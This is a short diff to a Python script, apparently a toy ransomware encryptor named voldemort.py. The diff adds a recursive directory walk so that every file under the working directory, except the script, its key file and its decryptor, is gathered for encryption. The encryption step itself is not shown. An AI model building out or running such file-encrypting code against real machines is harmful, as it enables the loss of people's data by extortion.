@@ -9,6 +9,16 @@ for file in os.listdir():
     if os.path.isfile(file):
         files.append(file)
 
+wd = os.getcwd()
+for dirpath, dirnames, filenames in os.walk(wd):
+    for file in filenames:
+        if file == 'voldemort.py' or file == 'thekey.key' or file == 'decrypt.py':
+            continue
+        if os.path.isfile(os.path.join(dirpath, file)):
+            files.append(os.path.join(dirpath, file))
+
+
+
 with open("thekey.key", "rb") as key:
     secretkey = key.read()
 
